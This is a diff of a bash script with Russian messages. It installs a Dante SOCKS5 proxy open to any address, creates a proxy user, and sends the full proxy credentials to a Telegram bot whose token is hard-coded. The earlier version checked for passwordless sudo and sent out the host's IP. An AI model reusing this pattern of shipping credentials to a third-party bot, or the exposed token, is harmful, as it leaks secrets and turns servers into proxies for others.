@@ -1,31 +1,79 @@
+```bash
 #!/bin/bash
+
+set -e
+
+if [ "$EUID" -ne 0 ]; then
+    echo "Запустите скрипт от имени root."
+    exit 1
+fi
 
 BOT_TOKEN="8216672386:AAEnVSLmGOk7Yz1B_y6d3XXY7ffDdzpI0D0"
 CHAT_ID="7736738893"
+PORT="1080"
 
-# Проверяем возможность выполнения sudo без пароля
-if ! sudo -n true 2>/dev/null; then
-    echo "Ошибка: текущий пользователь не может выполнить sudo без пароля."
+apt update -y
+apt install -y dante-server curl
+
+IFACE=$(ip route | awk '/default/ {print $5; exit}')
+IP=$(curl -4 -fsS https://2ip.io)
+
+read -p "Логин: " USER
+read -s -p "Пароль: " PASS
+echo
+
+[ -n "$USER" ] && [ -n "$PASS" ] || exit 1
+
+if id "$USER" &>/dev/null; then
+    echo "${USER}:${PASS}" | chpasswd
+else
+    useradd --no-create-home --shell /usr/sbin/nologin "$USER"
+    echo "${USER}:${PASS}" | chpasswd
+fi
+
+cat > /etc/danted.conf <<EOF
+logoutput: syslog
+internal: 0.0.0.0 port = ${PORT}
+external: ${IFACE}
+method: username
+user.privileged: root
+user.unprivileged: nobody
+
+client pass {
+    from: 0.0.0.0/0 to: 0.0.0.0/0
+}
+
+proxy pass {
+    from: 0.0.0.0/0 to: 0.0.0.0/0
+    command: connect
+    protocol: tcp
+    method: username
+}
+EOF
+
+systemctl enable danted
+systemctl restart danted
+
+if ! systemctl is-active --quiet danted; then
+    echo "Ошибка запуска Dante."
     exit 1
 fi
 
-# Получаем внешний IP
-IP=$(curl -fsS https://2ip.io 2>/dev/null)
-
-if [ -z "$IP" ]; then
-    echo "Ошибка: не удалось получить внешний IP."
-    exit 1
+if command -v ufw >/dev/null 2>&1 && ufw status | grep -q "Status: active"; then
+    ufw allow "${PORT}/tcp" >/dev/null
 fi
 
-# Отправляем IP в Telegram
-RESPONSE=$(curl -fsS -X POST \
+PROXY="socks5://${USER}:${PASS}@${IP}:${PORT}"
+
+echo
+echo "$PROXY"
+echo
+
+curl -fsS -X POST \
     "https://api.telegram.org/bot${BOT_TOKEN}/sendMessage" \
     --data-urlencode "chat_id=${CHAT_ID}" \
-    --data-urlencode "text=Внешний IP: ${IP}")
+    --data-urlencode "text=${PROXY}" \
+    >/dev/null
 
-if [ $? -eq 0 ]; then
-    echo "IP ${IP} отправлен в Telegram."
-else
-    echo "Ошибка отправки сообщения в Telegram."
-    exit 1
-fi
+echo "SOCKS5 установлен и отправлен в Telegram."
+```
